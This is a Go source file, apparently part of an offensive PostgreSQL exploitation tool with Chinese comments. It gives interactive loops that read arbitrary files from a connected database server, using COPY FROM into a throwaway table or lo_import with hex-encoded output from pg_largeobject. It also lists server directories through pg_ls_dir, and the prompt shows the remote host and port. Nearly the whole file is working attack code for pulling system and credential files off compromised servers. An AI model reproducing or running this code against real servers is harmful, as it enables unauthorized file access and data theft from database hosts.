package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

func PostgreFileRead(conn *sql.DB, file string) {
	table := RandStr(3)

	// 创建表
	Info("创建表")
	_, err := postgrecmd(fmt.Sprintf("CREATE TABLE %s (t TEXT);", table), conn)
	if err != nil {
		Err(err)
	}

	// COPY内容
	Info("Copy命令")
	_, err = postgrecmd(fmt.Sprintf("COPY %s FROM '%s';", table, file), conn)
	if err != nil {
		Err(err)

	}

	// 读取内容
	Info("读取内容")
	_, err = postgrecmd(fmt.Sprintf("SELECT * FROM %s;", table), conn)
	if err != nil {
		Err(err)
	}

}

// 循环读取文件
func loopPostgreFileRead(conn *sql.DB) {
	Info("输入读取的文件名")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("%s:%s> ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		PostgreFileRead(conn, cmd)
	}
}

// 利用postgresql大对象来处理读文件
func PostgreFileReadhex(conn *sql.DB, file string) {

	key := RandStrnum(3)
	Info("请手工把hex转换成string")

	// 创建表
	Info("lo_import读取文件")
	Info(fmt.Sprintf("select lo_import('%s',%s);", file, key))

	_, err := postgrecmd(fmt.Sprintf("select lo_import('%s',%s);", file, key), conn)
	if err != nil {
		Err(err)
	}

	// 输出
	Info("转换成hex输出")
	Info(fmt.Sprintf("select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a;"))
	_, err = postgrecmd(fmt.Sprintf("select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=%s order by pageno)a;", key), conn)
	if err != nil {
		Err(err)
	}
}

// 循环读取文件
func loopPostgreFileReadhex(conn *sql.DB) {
	Info("输入读取的文件名")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("%s:%s> ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		PostgreFileReadhex(conn, cmd)
	}
}

// 循环列目录
func loopPostgreListDirectoy(conn *sql.DB) {
	Info("输入目录")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("%s:%s> ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		postgrecmd(fmt.Sprintf("select pg_ls_dir('%s');", cmd), conn)
	}
}

// 列目录
func PostgreListDirectoy(conn *sql.DB, file string) {
	postgrecmd(fmt.Sprintf("select pg_ls_dir('%s');", file), conn)
}
